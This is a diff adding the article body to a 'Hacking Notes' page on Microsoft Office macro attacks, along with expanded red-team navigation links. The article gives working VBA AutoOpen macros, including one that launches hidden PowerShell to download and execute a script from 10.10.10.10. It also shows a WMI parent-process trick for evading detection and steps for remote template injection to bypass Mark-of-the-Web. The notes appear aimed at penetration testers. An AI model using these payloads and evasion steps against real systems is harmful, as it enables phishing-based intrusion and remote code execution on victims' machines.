@@ -10,13 +10,13 @@
 <meta name="generator" content="Jekyll v3.8.4" />
 <meta property="og:title" content="Microsoft Office Macros" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Notes for an ethical hacker." />
-<meta property="og:description" content="Notes for an ethical hacker." />
+<meta name="description" content="Visual Basic for Applications (VBA) Macro" />
+<meta property="og:description" content="Visual Basic for Applications (VBA) Macro" />
 <link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/client-side-attacks/microsoft-office-macros/" />
 <meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/client-side-attacks/microsoft-office-macros/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"Notes for an ethical hacker.","url":"http://0.0.0.0:4000/hackingnotes/client-side-attacks/microsoft-office-macros/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Microsoft Office Macros","@context":"http://schema.org"}</script>
+{"description":"Visual Basic for Applications (VBA) Macro","url":"http://0.0.0.0:4000/hackingnotes/client-side-attacks/microsoft-office-macros/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Microsoft Office Macros","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level ">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item current"><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -239,6 +295,8 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
+								
 							</ul>
 						</li>
 					
@@ -281,7 +339,78 @@
 				<h3>Microsoft Office Macros</h3>
 			</div>
 			<article class="content">
-				
+				<h1 id="visual-basic-for-applications-vba-macro">Visual Basic for Applications (VBA) Macro</h1>
+
+<p>VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.</p>
+
+<p>VBA is not all that different from VBScript, so it’s not too difficult to use the <code class="highlighter-rouge">wscript.shell object</code>.</p>
+
+<blockquote>
+  <p><strong>Note</strong>: The file must be saved in <code class="highlighter-rouge">.doc</code> format due inside <code class="highlighter-rouge">.docx</code> files cannot save macros.</p>
+</blockquote>
+
+<p>To create a macro go to <code class="highlighter-rouge">View -&gt; Macros</code> and create one.</p>
+
+<p><img src="/hackingnotes/images/macro-create.png" alt="Macro" /></p>
+
+<blockquote>
+  <p><strong>Note</strong>: It’s important to select the document in order to save the macro inside.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "calc"
+
+End Sub
+</code></pre></div></div>
+
+<p><img src="/hackingnotes/images/macro-calc.png" alt="Macro" /></p>
+
+<blockquote>
+  <p><strong>Note</strong>: To force the macro to trigger automatically when the document is opened, use the name<code class="highlighter-rouge">AutoOpen()</code>.</p>
+</blockquote>
+
+<h2 id="executing-a-powershell-payload">Executing a Powershell Payload</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""
+
+End Sub
+</code></pre></div></div>
+
+<h1 id="changing-prent-child-relationship">Changing Prent-Child Relationship</h1>
+
+<p>When a powershell is executed from a word macro a child <code class="highlighter-rouge">powershell.exe</code> process is created from <code class="highlighter-rouge">winword.exe</code> (MS Word as a Parent). This isn’t normal behaviour and highly suspicious.</p>
+
+<p>With <code class="highlighter-rouge">wmi</code> we can create another parent process and append the powershell to wmi and not to the MS Word.</p>
+
+<pre><code class="language-VB">Dim proc As Object
+Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+proc.Create "powershell"
+</code></pre>
+
+<blockquote>
+  <p><strong>OPSEC Note</strong>: In that case, powershell will be a child of <code class="highlighter-rouge">WmiPrvSE.exe</code> rather than MS Word.</p>
+</blockquote>
+
+<h1 id="remote-template-injection">Remote Template Injection</h1>
+
+<p>Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script.</p>
+
+<ul>
+  <li>Create a word add a macro and save it as <code class="highlighter-rouge">Word 97-2003 Template (.dot)</code>. This will be out malicious remote template, and we can also host this file.</li>
+  <li>Next, create a new document from the blank template located in <code class="highlighter-rouge">C:\Users\User\Documents\Custom Office Templates</code>. Add any content and save it as <code class="highlighter-rouge">.docx</code>.</li>
+  <li>Browse to the directory in explorer, right-click and select <code class="highlighter-rouge">7-zip -&gt; Open Archive</code>. Navigate to <code class="highlighter-rouge">word -&gt; _rels</code>, right-click on <code class="highlighter-rouge">settings.xml.rels</code> and select Edit. Change the Target entry and specify out hosted template.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Target="http://10.10.10.10/template.dot"
+</code></pre></div></div>
+<p>This will allow to execute the macro even if its flagged with MOTW.</p>
 
 			</article>
 		</section>
